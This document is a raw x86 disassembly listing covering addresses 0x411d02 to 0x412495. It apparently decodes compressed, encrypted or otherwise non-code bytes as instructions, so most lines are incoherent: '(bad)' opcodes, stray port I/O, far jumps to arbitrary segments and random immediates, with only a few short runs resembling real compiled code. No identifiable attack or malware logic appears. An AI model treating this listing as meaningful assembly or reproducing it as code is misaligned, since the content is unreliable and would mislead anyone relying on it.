  411d02:	js     0x411d7c
  411d04:	in     eax,0x7e
  411d06:	js     0x411d80
  411d08:	fstp   TBYTE PTR [eax+0x2661d384]
  411d0e:	add    eax,0xb34dd86d
  411d13:	in     eax,dx
  411d14:	fstp   TBYTE PTR [ebx]
  411d16:	push   eax
  411d17:	test   BYTE PTR [edi+0xc],al
  411d1a:	xor    bh,BYTE PTR [edx+0x249b97b]
  411d20:	std    
  411d21:	popa   
  411d22:	xlat   BYTE PTR ds:[ebx]
  411d23:	mov    bh,0x4c
  411d25:	jnp    0x411d3d
  411d27:	add    DWORD PTR [edx+0x16],0xffffff86
  411d2b:	jecxz  0x411da0
  411d2d:	call   0x7cc2:0xfde4bb2c
  411d34:	das    
  411d35:	jle    0x411d33
  411d37:	adc    al,0x7e
  411d39:	fmul   st(5),st
  411d3b:	test   cl,ah
  411d3d:	das    
  411d3e:	adc    DWORD PTR [ebx-0xa],ecx
  411d41:	out    dx,eax
  411d42:	ja     0x411cde
  411d44:	push   esp
  411d45:	xor    DWORD PTR [edi],ebp
  411d47:	push   0xfffffff4
  411d49:	imul   esi,DWORD PTR fs:[edi+edi*1-0x38cdfc3f],0x7fc35b02
  411d55:	sahf   
  411d56:	push   ebx
  411d57:	je     0x411d2e
  411d59:	(bad)  
  411d5a:	cmc    
  411d5b:	icebp  
  411d5c:	aas    
  411d5d:	xlat   BYTE PTR ds:[ebx]
  411d5e:	fwait
  411d5f:	and    edx,DWORD PTR [eax+0x4e]
  411d62:	je     0x411dde
  411d64:	mov    ds,WORD PTR [edi+ebx*2+0x578bc950]
  411d6b:	or     dh,al
  411d6d:	xor    al,0x9e
  411d6f:	aam    0xee
  411d71:	pop    ebx
  411d72:	loopne 0x411d85
  411d74:	rol    BYTE PTR [esi],cl
  411d76:	xor    eax,0x93c98c73
  411d7b:	adc    BYTE PTR [ebx-0x4f],al
  411d7e:	inc    esp
  411d7f:	mov    ds:0xd2cef209,al
  411d84:	mov    bl,0x4a
  411d86:	dec    eax
  411d87:	dec    ecx
  411d88:	sbb    eax,ecx
  411d8a:	daa    
  411d8b:	pusha  
  411d8c:	int    0x75
  411d8e:	inc    BYTE PTR [edx]
  411d90:	add    al,0xd7
  411d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d93:	rcl    BYTE PTR [edi+ebp*8],cl
  411d96:	pop    esi
  411d97:	mov    al,0xe6
  411d99:	mov    BYTE PTR [esi+0x5ca4cc70],dl
  411d9f:	sbb    eax,0xc4ee2da
  411da4:	mov    eax,0x76e94392
  411da9:	inc    eax
  411daa:	mov    ebp,0x7289ce1d
  411daf:	adc    al,0x74
  411db1:	lods   eax,DWORD PTR ds:[esi]
  411db2:	mov    ds,WORD PTR [ebx+0x33fd4f0d]
  411db8:	adc    al,0xcd
  411dba:	push   0x26
  411dbc:	mov    ds:0x9f1fec3,al
  411dc1:	jnp    0x411dc4
  411dc3:	in     al,dx
  411dc4:	repnz dec edx
  411dc6:	ret    
  411dc7:	loopne 0x411d93
  411dc9:	rol    DWORD PTR [edi],1
  411dcb:	das    
  411dcc:	adc    ebx,DWORD PTR [esi+0x6424cdb5]
  411dd2:	mov    BYTE PTR [edx+0x6172e09a],ah
  411dd8:	pushf  
  411dd9:	or     edx,0x73
  411ddc:	lahf   
  411ddd:	jae    0x411da0
  411ddf:	sbb    DWORD PTR [ebp-0x718af83a],0xffffffd6
  411de6:	adc    al,0x67
  411de8:	ds ds repz cmc 
  411dec:	in     eax,0x98
  411dee:	scas   eax,DWORD PTR es:[edi]
  411def:	fnsave [ebp+0x78]
  411df2:	retf   
  411df3:	scas   eax,DWORD PTR es:[edi]
  411df4:	inc    ebx
  411df5:	test   al,0x57
  411df7:	inc    eax
  411df8:	jo     0x411e1a
  411dfa:	pushf  
  411dfb:	lea    ecx,[esi+0x110d50c]
  411e01:	leave  
  411e02:	mov    dh,0xb8
  411e04:	pushf  
  411e05:	dec    BYTE PTR [ebx]
  411e07:	dec    edi
  411e08:	or     al,0x52
  411e0a:	or     edx,DWORD PTR [ebx-0x70]
  411e0d:	(bad)  
  411e0e:	std    
  411e0f:	clc    
  411e10:	popf   
  411e11:	jb     0x411dd7
  411e13:	ficomp DWORD PTR [ebx-0xbe8b230]
  411e19:	popf   
  411e1a:	pop    ebx
  411e1b:	mov    bl,0x43
  411e1d:	mov    dh,0x27
  411e1f:	cmp    eax,0xa2ac587e
  411e24:	sti    
  411e25:	push   ds
  411e26:	jge    0x411db4
  411e28:	xchg   DWORD PTR [ebx],esp
  411e2a:	dec    esi
  411e2b:	cmp    DWORD PTR [edi+0x5e],esp
  411e2e:	loope  0x411e7e
  411e30:	test   al,0x1f
  411e32:	jno    0x411dc3
  411e34:	adc    DWORD PTR [ecx],ebx
  411e36:	sub    eax,0xfa2952e6
  411e3b:	out    0xf9,eax
  411e3d:	test   DWORD PTR [esp+edx*2+0x18056bb8],eax
  411e44:	jl     0x411e5f
  411e46:	pop    esi
  411e47:	mov    ss,WORD PTR [ecx-0x158ee5d4]
  411e4d:	mov    esp,0x735735e
  411e52:	mov    eax,0x3ac34567
  411e57:	std    
  411e58:	jg     0x411eca
  411e5a:	lock sub al,0xd
  411e5d:	sub    eax,DWORD PTR [esi+0x42]
  411e60:	fmul   DWORD PTR [edx]
  411e62:	adc    bh,BYTE PTR [edi]
  411e64:	or     eax,0xa747434d
  411e69:	push   eax
  411e6a:	push   edx
  411e6b:	out    dx,al
  411e6c:	mov    edi,0x7d1f12db
  411e71:	das    
  411e72:	xchg   DWORD PTR [eax+0x31],esp
  411e75:	aaa    
  411e76:	jle    0x67c2951c
  411e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e7d:	jecxz  0x411e92
  411e7f:	pop    ebp
  411e80:	test   BYTE PTR [ebx-0x46ca703b],ch
  411e86:	outs   dx,BYTE PTR ds:[esi]
  411e87:	and    bh,bl
  411e89:	fwait
  411e8a:	sub    DWORD PTR [ebx],0xffffff90
  411e8d:	sti    
  411e8e:	out    0x31,eax
  411e90:	jecxz  0x411ebf
  411e92:	ds (bad) 
  411e94:	stos   BYTE PTR es:[edi],al
  411e95:	sub    DWORD PTR [edi+0x3467f356],ebp
  411e9b:	ja     0x411e91
  411e9d:	retf   
  411e9e:	cmp    al,0x70
  411ea0:	stos   DWORD PTR es:[edi],eax
  411ea1:	pushf  
  411ea2:	fwait
  411ea3:	inc    eax
  411ea4:	pop    ecx
  411ea5:	inc    edx
  411ea6:	mov    ds:0x5ff57551,al
  411eab:	outs   dx,BYTE PTR ds:[esi]
  411eac:	out    0x3b,al
  411eae:	jbe    0x411f18
  411eb0:	iret   
  411eb1:	test   DWORD PTR [eax+0x6412509a],0x4db91d19
  411ebb:	iret   
  411ebc:	(bad)  
  411ebd:	bound  edx,QWORD PTR [esi]
  411ebf:	sahf   
  411ec0:	jno    0x411e4f
  411ec2:	bound  ebp,QWORD PTR [eax]
  411ec4:	ins    BYTE PTR es:[edi],dx
  411ec5:	jmp    0x7541:0xdc8ba38b
  411ecc:	bound  esp,QWORD PTR [ebx+esi*2]
  411ecf:	outs   dx,BYTE PTR ds:[esi]
  411ed0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ed1:	sar    DWORD PTR [ecx+0x3d],cl
  411ed4:	test   DWORD PTR [edx+edx*1],eax
  411ed7:	add    ecx,ebp
  411ed9:	xor    al,0x79
  411edb:	aad    0xa3
  411edd:	ins    BYTE PTR es:[edi],dx
  411ede:	dec    esi
  411edf:	push   ecx
  411ee0:	mov    ah,0x88
  411ee2:	lods   al,BYTE PTR ds:[esi]
  411ee3:	sub    al,0x44
  411ee5:	cli    
  411ee6:	add    ecx,DWORD PTR [edi+0x7434b1fd]
  411eec:	out    dx,al
  411eed:	cmc    
  411eee:	push   edx
  411eef:	cmp    BYTE PTR [edx-0x62],ah
  411ef2:	test   al,0x6f
  411ef4:	lds    ecx,FWORD PTR [ebx-0x6f]
  411ef7:	and    eax,ebx
  411ef9:	test   eax,0x39f81d4f
  411efe:	imul   esp,ecx,0x5d7f3a77
  411f04:	(bad)  
  411f05:	and    edi,DWORD PTR [esi+0x5e7eec01]
  411f0b:	push   ebx
  411f0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f0d:	mov    esi,edx
  411f0f:	mov    cl,0xc4
  411f11:	int    0xdc
  411f13:	cmp    eax,0x55fd21cc
  411f18:	jecxz  0x411ebd
  411f1a:	inc    ebp
  411f1b:	cmp    DWORD PTR [ecx-0x543289d],esp
  411f21:	outs   dx,DWORD PTR ds:[esi]
  411f22:	out    dx,eax
  411f23:	aam    0x8a
  411f25:	pop    ss
  411f26:	out    0xde,eax
  411f28:	push   ebp
  411f29:	jno    0x411ef3
  411f2b:	mov    es,WORD PTR [esi+ecx*8-0x7e]
  411f2f:	div    DWORD PTR [ecx-0x3b]
  411f32:	mov    eax,0x2bee411d
  411f37:	rol    ebp,1
  411f39:	dec    ebx
  411f3b:	xchg   ebp,eax
  411f3c:	push   eax
  411f3d:	nop
  411f3e:	jle    0x411f8a
  411f40:	sub    eax,0x1121394f
  411f45:	ret    
  411f46:	or     BYTE PTR [edi+ebp*8],dh
  411f49:	call   0x30f91ebf
  411f4e:	push   es
  411f4f:	sbb    esi,0xc61099eb
  411f55:	repnz dec ebp
  411f57:	ret    
  411f58:	fwait
  411f59:	aad    0x4f
  411f5b:	lahf   
  411f5c:	shl    BYTE PTR [ecx+0x67],0x36
  411f60:	dec    ebp
  411f61:	xor    BYTE PTR [esp+edi*4-0x357eee30],dh
  411f68:	jmp    0xea56dcf6
  411f6d:	jb     0x411fbb
  411f6f:	jb     0x411f90
  411f71:	gs push edi
  411f73:	mov    edx,DWORD PTR [ebp-0x3c]
  411f76:	mov    edi,DWORD PTR [ebp-0x4]
  411f79:	xor    edi,eax
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	jmp    0x786b:0xebe5a017
  411f95:	js     0x411f7c
  411f97:	jle    0x412011
  411f99:	js     0x411fd4
  411f9b:	push   cs
  411f9c:	repz xchg edi,eax
  411f9e:	retf   
  411f9f:	sti    
  411fa0:	cwde   
  411fa1:	or     eax,0x63f471fb
  411fa6:	xor    eax,0xd2eec4ea
  411fab:	ins    DWORD PTR es:[edi],dx
  411fac:	inc    esi
  411fad:	(bad)  
  411fae:	sbb    eax,DWORD PTR [eax+0x43]
  411fb1:	xchg   esi,eax
  411fb2:	retf   0x8678
  411fb5:	hlt    
  411fb6:	add    BYTE PTR [ebp-0x1ed0f2ba],bl
  411fbc:	pop    ss
  411fbd:	cmp    cl,BYTE PTR [edi+0x7fe5184c]
  411fc3:	ins    DWORD PTR es:[edi],dx
  411fc4:	mov    dl,0xb7
  411fc6:	inc    ebx
  411fc7:	push   ecx
  411fc8:	icebp  
  411fc9:	mov    ds:0x17550dc5,al
  411fce:	fild   DWORD PTR [ebp-0x4f]
  411fd1:	jp     0x41204f
  411fd3:	pop    ebp
  411fd4:	mov    ds:0x7ba6335e,al
  411fd9:	jnp    0x411f5e
  411fdb:	pop    edx
  411fdc:	fadd   QWORD PTR [ebx-0x42a9078a]
  411fe2:	outs   dx,BYTE PTR ds:[esi]
  411fe3:	fsub   st,st(3)
  411fe5:	pop    edx
  411fe6:	lock xchg DWORD PTR [esi-0x4c],esp
  411fea:	int    0x9f
  411fec:	mov    esi,esi
  411fee:	mov    esi,0xc1cac1b0
  411ff3:	lods   eax,DWORD PTR ds:[esi]
  411ff4:	push   edi
  411ff5:	jmp    0x412020
  411ff7:	shld   DWORD PTR [ecx],ebx,0x67
  411ffb:	push   eax
  411ffc:	adc    bh,BYTE PTR [ebx-0x59]
  411fff:	ds std 
  412001:	outs   dx,BYTE PTR ds:[esi]
  412002:	push   edx
  412003:	xor    esp,edx
  412005:	pop    ecx
  412006:	and    cl,dl
  412008:	imul   eax,DWORD PTR ds:0x84d3094a,0xffffffa7
  41200f:	cmp    eax,0x89767c41
  412014:	ret    
  412015:	sbb    DWORD PTR [edi],ebp
  412017:	mov    dh,0x4d
  412019:	and    esp,edi
  41201b:	sbb    DWORD PTR [eax],ebp
  41201d:	mov    ah,0x38
  41201f:	push   es
  412020:	jbe    0x411fcd
  412022:	outs   dx,DWORD PTR ds:[esi]
  412023:	pop    ecx
  412024:	fwait
  412025:	loopne 0x411fb1
  412027:	mov    ax,0x7177
  41202b:	outs   dx,DWORD PTR ds:[esi]
  41202c:	aas    
  41202d:	out    dx,eax
  41202e:	loop   0x412049
  412030:	xchg   esp,eax
  412031:	loope  0x41208d
  412033:	das    
  412034:	(bad)  
  412035:	lods   eax,DWORD PTR ds:[esi]
  412036:	sub    al,0x81
  412038:	mov    eax,0xcb2912a5
  41203d:	iret   
  41203e:	daa    
  41203f:	cwde   
  412040:	imul   ebx,ecx,0xc12ea642
  412046:	out    dx,eax
  412047:	(bad)  
  412048:	je     0x41206d
  41204a:	mov    es,edx
  41204c:	aad    0xad
  41204e:	push   eax
  41204f:	push   0x11
  412051:	test   edi,eax
  412053:	push   eax
  412054:	fwait
  412055:	popf   
  412056:	test   eax,0xb9067a9a
  41205b:	aaa    
  41205c:	jmp    0x2d30e44
  412061:	dec    eax
  412062:	js     0x4120a7
  412064:	jmp    0x4120d0
  412066:	stos   BYTE PTR es:[edi],al
  412067:	xchg   esp,eax
  412068:	inc    ecx
  412069:	xchg   ecx,eax
  41206a:	fisttp WORD PTR ds:0x39669cb3
  412070:	(bad)  
  412071:	rcl    bh,1
  412073:	mov    ebp,0xa150055d
  412078:	cmp    al,0x5d
  41207a:	popf   
  41207b:	adc    bl,BYTE PTR [eax]
  41207d:	mov    ebx,DWORD PTR [esi+ebx*1]
  412080:	or     al,0x92
  412082:	or     DWORD PTR [eax+0x49da9b24],ecx
  412088:	call   0x9bfb5151
  41208d:	push   0xffffffc4
  41208f:	or     eax,0x1055c25d
  412094:	sahf   
  412095:	imul   ebx,DWORD PTR [ecx+eiz*4],0xffffff93
  412099:	mov    ah,0xd4
  41209b:	mov    WORD PTR [eax],fs
  41209d:	fcomi  st,st(0)
  41209f:	cmp    ebx,ebp
  4120a1:	xor    BYTE PTR [edi],0x37
  4120a4:	std    
  4120a5:	inc    ebp
  4120a6:	push   edx
  4120a7:	cmp    esp,DWORD PTR ds:0xc993ca2a
  4120ad:	pop    edi
  4120ae:	dec    esp
  4120af:	pop    es
  4120b0:	loopne 0x412039
  4120b2:	shr    DWORD PTR [edi-0x7],0x7b
  4120b6:	cmc    
  4120b7:	adc    esp,DWORD PTR [ebx+0x20]
  4120ba:	push   0xc9dbd66b
  4120bf:	std    
  4120c0:	enter  0xf711,0xf1
  4120c4:	xchg   ebp,eax
  4120c5:	and    DWORD PTR [edx+0x64],esp
  4120c8:	jge    0x41210f
  4120ca:	call   0x5622:0x49a86fa7
  4120d1:	in     al,0x8
  4120d3:	mov    eax,ds:0xcf79614c
  4120d8:	pop    ss
  4120d9:	add    eax,0x2b21a2bc
  4120de:	mov    esi,0x3d23e746
  4120e3:	jnp    0x4120fa
  4120e5:	xchg   DWORD PTR [ecx+0x78b33abb],edx
  4120eb:	add    al,0xf7
  4120ed:	push   edi
  4120ee:	adc    dl,ch
  4120f0:	mov    cl,0xbb
  4120f2:	cmp    eax,0x46cb97c8
  4120f7:	add    esi,DWORD PTR [eax-0x6d4b3f8a]
  4120fd:	push   0xffffffa1
  4120ff:	and    al,0x52
  412101:	mov    DWORD PTR [esi+0x1103424],edi
  412107:	das    
  412108:	xor    eax,DWORD PTR [ecx-0x44]
  41210b:	mov    dl,0xcf
  41210d:	mov    DWORD PTR [edi+0x61],esp
  412110:	fisubr WORD PTR [edx-0x13]
  412113:	mov    esi,0xa58f51ea
  412118:	jmp    0x7ebdd0e9
  41211d:	mov    DWORD PTR [ebx-0x7c],ebx
  412120:	inc    edi
  412121:	push   ecx
  412122:	xor    BYTE PTR [eax-0x6ce7569c],dl
  412128:	arpl   WORD PTR [eax],sp
  41212a:	nop
  41212b:	xchg   edx,eax
  41212c:	push   ecx
  41212d:	jmp    DWORD PTR [edi*8+0x1f0548e7]
  412134:	or     DWORD PTR [edx+ebx*1+0x6b],edi
  412138:	lods   al,BYTE PTR ds:[esi]
  412139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41213a:	clc    
  41213b:	cs or  al,0xa7
  41213e:	imul   esi,esi,0x47
  412141:	mov    dh,BYTE PTR [ecx]
  412143:	scas   al,BYTE PTR es:[edi]
  412144:	mul    BYTE PTR [eax]
  412146:	jmp    0x41218b
  412148:	mov    edx,0xec6655fb
  41214d:	inc    eax
  41214e:	mov    bh,0x1a
  412150:	lahf   
  412151:	fidiv  DWORD PTR [edi]
  412153:	and    eax,0x479f3c2a
  412158:	pop    edx
  412159:	and    BYTE PTR ds:0x6a9109b,cl
  41215f:	mov    eax,cs:0xad56235
  412165:	mov    ch,0x1d
  412167:	mov    dh,0xa4
  412169:	cwde   
  41216a:	fcmove st,st(2)
  41216c:	mov    ds:0x29dd2a33,eax
  412171:	std    
  412172:	add    eax,0x957fcff
  412177:	lock ins DWORD PTR es:[edi],dx
  412179:	jno    0x41217f
  41217b:	in     al,dx
  41217c:	(bad)  
  41217d:	out    0x28,eax
  41217f:	push   es
  412180:	cmp    eax,0x23ac2ed
  412185:	mov    BYTE PTR [edx+0x1e],bh
  412188:	push   ecx
  412189:	and    ch,dh
  41218b:	push   ss
  41218c:	shr    BYTE PTR ds:0xe6cb463d,0xb7
  412193:	cwde   
  412194:	sbb    bh,BYTE PTR [bp+0x15]
  412198:	mov    ebp,ebp
  41219a:	or     bl,al
  41219c:	mov    WORD PTR [edi-0x54],ss
  41219f:	fidiv  WORD PTR [esi-0x7a]
  4121a2:	loop   0x412188
  4121a4:	mov    edi,?
  4121a6:	xchg   ebx,eax
  4121a7:	push   esi
  4121a8:	in     eax,0x4a
  4121aa:	lods   eax,DWORD PTR ds:[esi]
  4121ab:	and    al,0xb
  4121ad:	inc    ebp
  4121ae:	int    0x2
  4121b0:	into   
  4121b1:	xlat   BYTE PTR ss:[ebx]
  4121b3:	mov    ebx,0xdfd1aa30
  4121b8:	in     al,dx
  4121b9:	push   es
  4121ba:	or     bl,BYTE PTR [ebp-0x7499412f]
  4121c0:	retf   
  4121c1:	in     eax,0xdc
  4121c3:	xchg   edx,eax
  4121c4:	mov    edi,0x689005ed
  4121c9:	ins    DWORD PTR es:[edi],dx
  4121ca:	or     DWORD PTR [ebx-0x33],esi
  4121cd:	inc    ebx
  4121ce:	out    0x61,al
  4121d0:	mov    esp,ebp
  4121d2:	call   0x7042:0xa2036d7f
  4121d9:	jge    0x4121ef
  4121db:	sbb    BYTE PTR [ebx],ah
  4121dd:	jge    0x41221e
  4121df:	in     eax,dx
  4121e0:	cmp    DWORD PTR [ebx+0x2897ba81],ebx
  4121e6:	adc    DWORD PTR [ecx+0x5e125f82],edx
  4121ec:	xlat   BYTE PTR ds:[ebx]
  4121ed:	mov    cl,0x2c
  4121ef:	aas    
  4121f0:	js     0x412223
  4121f2:	mov    al,ch
  4121f4:	add    al,0x2d
  4121f6:	push   ecx
  4121f7:	inc    edx
  4121f8:	in     eax,0x98
  4121fa:	in     eax,0xf9
  4121fc:	dec    esi
  4121fd:	repnz ins BYTE PTR es:[edi],dx
  4121ff:	adc    edx,edx
  412201:	pop    ss
  412202:	arpl   WORD PTR [ecx+0x3f90360],dx
  412208:	ror    DWORD PTR [edi],1
  41220a:	scas   eax,DWORD PTR es:[edi]
  41220b:	xlat   BYTE PTR ds:[ebx]
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	loop   0x41226e
  412235:	js     0x4121cb
  412237:	push   eax
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412240:	mov    esi,0x91e90f07
  412245:	rcr    BYTE PTR [esi-0x7b4c4c8d],0x8d
  41224c:	dec    ebp
  41224d:	hlt    
  41224e:	inc    esp
  41224f:	lods   al,BYTE PTR ds:[esi]
  412250:	test   BYTE PTR [edx-0x31ac4bea],bl
  412256:	pop    eax
  412257:	xchg   esp,eax
  412258:	adc    esp,DWORD PTR [ecx-0xa4bc334]
  41225e:	fstp   TBYTE PTR [esp+eax*8-0x12]
  412262:	pop    ds
  412263:	xchg   edx,eax
  412264:	sbb    eax,0x7682acb7
  412269:	in     al,dx
  41226a:	pop    ebp
  41226b:	mov    ecx,0x4fa8a7a1
  412270:	jo     0x412274
  412272:	cmp    dh,BYTE PTR [eax]
  412274:	cmp    edi,DWORD PTR [ebx+esi*4]
  412277:	or     ah,0x9f
  41227a:	gs dec edi
  41227c:	loope  0x412229
  41227e:	aad    0xfa
  412280:	sub    al,0xa9
  412282:	lea    eax,[edx]
  412284:	js     0x41220e
  412286:	push   eax
  412287:	ret    
  412288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412289:	(bad)  
  41228a:	pop    ebx
  41228b:	pop    es
  41228c:	lods   eax,DWORD PTR ds:[esi]
  41228d:	rcl    DWORD PTR [esi],1
  41228f:	cmp    al,BYTE PTR [ecx+0x6b]
  412292:	pop    eax
  412293:	ss dec edx
  412295:	jb     0x412230
  412297:	mov    edx,0xa0cb53ba
  41229c:	mov    ds,ecx
  41229e:	jae    0x4122cf
  4122a0:	mov    ebp,DWORD PTR [esi-0x1f6f2012]
  4122a6:	sub    BYTE PTR [edx-0x6c],0xac
  4122aa:	push   ds
  4122ab:	xchg   ebp,eax
  4122ac:	push   esi
  4122ad:	es pop ss
  4122af:	sar    DWORD PTR [ebx],1
  4122b1:	outs   dx,DWORD PTR ds:[esi]
  4122b2:	mov    ebx,0xed2a83e2
  4122b7:	loop   0x41231d
  4122b9:	cmp    bl,BYTE PTR [edi-0x66]
  4122bc:	sub    al,0xcb
  4122be:	sbb    ebx,DWORD PTR [eax+0x1d8ceb88]
  4122c4:	sub    al,0x15
  4122c6:	nop
  4122c7:	jp     0x4122a2
  4122c9:	je     0x412309
  4122cb:	or     DWORD PTR [esp+eiz*4-0x4f],ebp
  4122cf:	adc    ebp,DWORD PTR [eax+ebp*1+0x3b7815b8]
  4122d6:	fidiv  DWORD PTR [esi+0x6b]
  4122d9:	mov    dh,0x3d
  4122db:	cwde   
  4122dc:	scas   eax,DWORD PTR es:[edi]
  4122dd:	out    dx,eax
  4122de:	add    al,0xa0
  4122e0:	enter  0x8727,0xaa
  4122e4:	iret   
  4122e5:	cmp    ch,BYTE PTR [edx-0x438d214d]
  4122eb:	pop    ds
  4122ec:	xchg   edx,eax
  4122ed:	mov    DWORD PTR [esi+0x279d28a9],ecx
  4122f3:	popa   
  4122f4:	addr16 ret 
  4122f6:	jnp    0x4122d1
  4122f8:	push   eax
  4122f9:	adc    al,0x8c
  4122fb:	shl    DWORD PTR [edx],1
  4122fd:	jge    0x412288
  4122ff:	loope  0x41231d
  412301:	(bad)  
  412302:	and    cl,BYTE PTR [ebx+ebp*1]
  412305:	lods   eax,DWORD PTR ds:[esi]
  412306:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412307:	mov    al,ds:0x652ce139
  41230c:	aad    0x6
  41230e:	mov    edi,0x642b7408
  412313:	ja     0x4122a6
  412315:	push   esi
  412316:	jbe    0x4122f4
  412318:	sti    
  412319:	push   es
  41231a:	push   edi
  41231b:	jle    0x41232f
  41231d:	fwait
  41231e:	or     eax,DWORD PTR [ebx+ebp*4-0x2d]
  412322:	push   cs
  412323:	jmp    DWORD PTR [ebx]
  412325:	jb     0x4122d7
  412327:	push   cs
  412328:	inc    ebp
  412329:	jo     0x4122c3
  41232b:	or     BYTE PTR [edi-0x1ef9747a],al
  412331:	or     bh,al
  412333:	xchg   BYTE PTR [edx-0x53f0e556],bh
  412339:	xchg   edx,eax
  41233a:	push   ebp
  41233b:	add    DWORD PTR [esi-0x27],edi
  41233e:	in     al,dx
  41233f:	fild   QWORD PTR [esi]
  412341:	dec    edx
  412342:	inc    ecx
  412343:	or     eax,0x4c724301
  412348:	sar    edi,0xe8
  41234b:	mov    eax,ds:0xe2a30d5f
  412350:	cwde   
  412351:	sub    DWORD PTR ds:0x16200c81,esi
  412357:	cmc    
  412358:	xchg   ebx,eax
  412359:	xchg   ecx,eax
  41235a:	pushf  
  41235b:	aad    0xa8
  41235d:	add    bl,BYTE PTR [ebx+0x3d]
  412360:	rcr    BYTE PTR [edx],cl
  412362:	mov    DWORD PTR [ecx],ebx
  412364:	or     al,BYTE PTR [esi]
  412366:	xchg   edx,eax
  412367:	jmp    0x5e98:0x8be957b5
  41236e:	cld    
  41236f:	pop    ecx
  412370:	enter  0xc696,0x81
  412374:	cmp    al,0x59
  412376:	aaa    
  412377:	arpl   WORD PTR [ebp+0x8],di
  41237a:	jg     0x412398
  41237c:	adc    al,0xc9
  41237e:	push   ebx
  41237f:	leave  
  412380:	inc    esp
  412381:	inc    ebp
  412382:	pop    ss
  412383:	xor    ecx,esi
  412385:	mov    ebx,0xe3ca48b5
  41238a:	js     0x4123d2
  41238c:	adc    BYTE PTR cs:[edi],dl
  41238f:	cmp    DWORD PTR [ebp-0x77dd04a4],ebp
  412395:	les    edx,FWORD PTR [edi+0x14]
  412398:	pop    ebp
  412399:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41239a:	and    BYTE PTR [edi+0x4a],dl
  41239d:	loop   0x4123fd
  41239f:	dec    edi
  4123a0:	cmp    BYTE PTR [eax+edi*4-0x3a],0xef
  4123a5:	adc    esi,DWORD PTR [esi+0x78616014]
  4123ab:	mov    BYTE PTR [edx],cl
  4123ad:	fistp  WORD PTR [ebx+0x11980d5b]
  4123b3:	cwde   
  4123b4:	jb     0x4123be
  4123b6:	cmp    DWORD PTR [eax-0x12],edi
  4123b9:	pop    ecx
  4123ba:	cmp    esi,DWORD PTR [edx]
  4123bc:	das    
  4123bd:	dec    ebp
  4123be:	push   ecx
  4123bf:	mov    ebx,0xf5bb83c7
  4123c4:	dec    esp
  4123c5:	dec    eax
  4123c6:	xor    al,0xbd
  4123c8:	ja     0x412353
  4123ca:	mov    dh,0x44
  4123cc:	div    ebp
  4123ce:	inc    edx
  4123cf:	dec    edi
  4123d0:	cs leave 
  4123d2:	in     eax,dx
  4123d3:	push   0xffffffc7
  4123d5:	movmskps ebp,xmm3
  4123d8:	add    eax,DWORD PTR [ecx+0x5d]
  4123db:	mov    ss,WORD PTR [ebp-0x1f3c1555]
  4123e1:	test   cl,dh
  4123e3:	add    bl,BYTE PTR [ebx+0xf8c4bbd]
  4123e9:	dec    ebp
  4123ea:	push   esi
  4123eb:	loope  0x412460
  4123ed:	dec    ebp
  4123ee:	je     0x412421
  4123f0:	ficomp WORD PTR [edi-0x6b]
  4123f3:	xor    eax,0xef638ca3
  4123f8:	inc    eax
  4123f9:	sahf   
  4123fa:	dec    esp
  4123fb:	jae    0x4123f6
  4123fd:	lods   al,BYTE PTR ds:[esi]
  4123fe:	add    bh,bl
  412400:	imul   esi,esp,0xffffffdb
  412403:	enter  0x1ff2,0xb2
  412407:	push   eax
  412408:	pop    esi
  412409:	push   edi
  41240a:	sub    ebx,DWORD PTR [eax-0x750914b3]
  412410:	mov    al,0x16
  412412:	ret    0x76e2
  412415:	add    al,BYTE PTR [eax-0x65]
  412418:	test   DWORD PTR [ebp+0x16c6a3fc],ebp
  41241e:	(bad)  
  41241f:	and    dl,dl
  412421:	stc    
  412422:	jno    0x412491
  412424:	mov    edx,0x485e4077
  412429:	mov    ch,0xd4
  41242b:	ds jmp 0x5bae9880
  412431:	xchg   edx,eax
  412432:	xor    dl,BYTE PTR [eax]
  412434:	cmp    al,0x7c
  412436:	dec    eax
  412437:	test   BYTE PTR cs:[edi-0x78],al
  41243b:	jns    0x412412
  41243d:	xchg   ebp,eax
  41243e:	sub    eax,0xe9e0f46c
  412443:	inc    ebx
  412444:	in     eax,0x26
  412446:	xchg   DWORD PTR [ecx+0x3df9a5b7],eax
  41244c:	mov    ah,0x3c
  41244e:	mov    edx,0xf6507e7e
  412453:	jno    0x4123e5
  412455:	test   eax,0x977b18a4
  41245a:	push   ds
  41245b:	sbb    DWORD PTR ds:0x9af32198,edx
  412461:	pop    esp
  412462:	ficom  DWORD PTR [edx+0x2034d6e2]
  412468:	xor    ecx,DWORD PTR [esi-0x10]
  41246b:	xchg   ebx,eax
  41246c:	push   esp
  41246d:	out    dx,al
  41246e:	inc    ebp
  41246f:	sub    BYTE PTR [esp+ebp*2],ch
  412472:	dec    ebp
  412473:	je     0x41241f
  412475:	rcl    BYTE PTR [ecx-0xbc2356b],cl
  41247b:	mov    ch,bl
  41247d:	aas    
  41247e:	sbb    esp,DWORD PTR [eax+eax*1+0x19]
  412482:	jg     0x412430
  412484:	imul   ebx,DWORD PTR [ebx+0x70],0x70b7b99
  41248b:	mov    edx,0x5ca74c93
  412490:	mov    DWORD PTR [edx-0x42],esp
  412493:	rcl    eax,1
  412495:	cmp    bl,BYTE PTR [edx-0x6f]
